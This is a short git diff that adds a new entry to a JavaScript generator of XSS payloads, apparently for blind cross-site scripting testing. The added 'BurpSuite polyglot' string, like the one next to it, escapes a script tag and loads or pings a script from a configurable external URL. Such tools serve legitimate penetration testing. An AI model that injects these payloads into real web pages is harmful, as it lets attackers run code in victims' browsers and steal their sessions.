@@ -26,6 +26,12 @@ exports.generatePayloads = config => {
     },
     {
       description: 'PortSwigger - BurpSuite Polygot Payload',
+      payload: `</script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source),s.stack=Error().stack,s.src=(/,/+/${
+        config.url
+      }.slice(2),document.documentElement.appendChild(s))//'>`
+    },
+    {
+      description: 'PortSwigger - BurpSuite Polygot Payload',
       payload: `/*</script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+((new(Image)).src=((new(Image)).src=([]+//${
         config.url
       }/mH/).replace(/\\/g,[]))//'>`
